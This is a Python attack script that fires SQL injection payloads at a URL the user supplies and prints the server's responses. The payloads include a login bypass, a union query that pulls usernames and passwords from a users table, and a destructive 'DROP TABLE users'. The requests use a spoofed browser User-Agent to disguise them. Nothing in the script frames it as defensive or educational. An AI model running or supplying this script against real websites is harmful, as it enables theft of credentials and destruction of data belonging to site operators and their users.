import requests
import sys
import urllib.parse
from requests.exceptions import RequestException

# Define vulnerable URL
TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else input("Enter target URL with vulnerable parameter (e.g., http://site.com/index.php?id=): ")

# SQL Injection Payloads
sql_payloads = [
    "' OR 1=1 --",              # Bypassing login, etc.
    "' UNION SELECT NULL --",    # Union-based injection
    "' AND 1=1 --",              # Simple boolean-based injection
    "' AND 1=2 --",              # To detect error-based responses
    "'; DROP TABLE users; --",   # Dangerous destructive SQL injection
    "' UNION SELECT username, password FROM users --",  # Extracting data
]

# Optional headers to disguise the request
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Content-Type': 'application/x-www-form-urlencoded',
}

# Function to send the SQL payload and analyze the response
def send_sql_injection(payload):
    encoded_payload = urllib.parse.quote(payload)  # Encode payload to avoid issues
    exploit_url = f"{TARGET_URL}{encoded_payload}"

    print(f"[*] Sending payload: {payload}")
    try:
        response = requests.get(exploit_url, headers=headers, timeout=10)
        if response.status_code == 200:
            print("[+] Exploit succeeded! Response:")
            print(response.text[:500])  # Print first 500 characters of response
        else:
            print(f"[-] Exploit failed with status code: {response.status_code}")
    except RequestException as e:
        print(f"[!] Error executing payload: {e}")

# Function to run all SQL injection tests
def run_sql_injection_exploit():
    print(f"[*] Targeting {TARGET_URL} for SQL injection...")
    for payload in sql_payloads:
        send_sql_injection(payload)

if __name__ == "__main__":
    if TARGET_URL:
        run_sql_injection_exploit()
    else:
        print("Please provide a target URL with a vulnerable parameter.")
